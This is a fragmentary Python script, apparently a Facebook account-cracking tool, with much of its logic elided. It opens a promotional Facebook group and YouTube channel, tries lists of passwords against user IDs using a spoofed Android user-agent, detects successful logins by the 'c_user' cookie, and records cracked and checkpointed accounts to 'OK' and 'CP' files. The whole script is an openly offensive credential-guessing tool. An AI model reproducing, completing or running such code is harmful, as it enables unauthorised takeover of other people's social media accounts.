...
import os
os.system('xdg-open https://m.facebook.com/groups/61568619063082/?ref=share&mibextid=NSMWBT')
...
os.system("xdg-open https://youtube.com/@pudii")
...
def random_number():
	...
	print('[?] IDS SAVED IN kick OK.txt,cp.txt')
	...
	try:
		...
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[kick-OK] '+uid+' | '+ps)
				...
				print('\r\033[1;31m[kick-CP] '+uid+' | '+ps)
		...
		sys.stdout.write(f"\r\x1b[1;32m[ kick ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}] ")
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 11.0; BZT-AL00 Build/HUAWEIBZT-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.22 Safari/537.36;]',}
			...
			if 'c_user' in log_cookies:
				...
				print('\r\033[1;32m[kick-FIRE🥰] '+uid+' | '+ps)
		...
		sys.stdout.write('\r\33[1;37m[OP-kick] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
